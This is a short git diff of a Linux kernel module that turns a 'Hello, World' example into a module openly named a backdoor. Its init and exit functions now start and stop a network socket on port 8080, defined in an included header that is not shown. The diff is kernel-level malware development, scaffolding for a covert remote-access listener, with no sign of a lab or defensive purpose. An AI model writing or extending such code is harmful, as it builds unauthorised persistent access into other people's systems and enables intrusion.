@@ -2,15 +2,20 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 
+#include "backdoor_socket.h"
+
+#define PORT 8080
+
 static int __init backdoor_init(void)
 {
-	printk(KERN_INFO "Hello, World!\n");
-	return 0;
+	printk(KERN_DEBUG "Initializing backdoor module\n");
+	return backdoor_socket_init(PORT);
 }
 
 static void __exit backdoor_exit(void)
 {
-	printk(KERN_INFO "Goodbye world...\n");
+	printk(KERN_DEBUG "Exiting backdoor module\n");
+  backdoor_socket_exit();
 }
 
 MODULE_LICENSE("GPL");
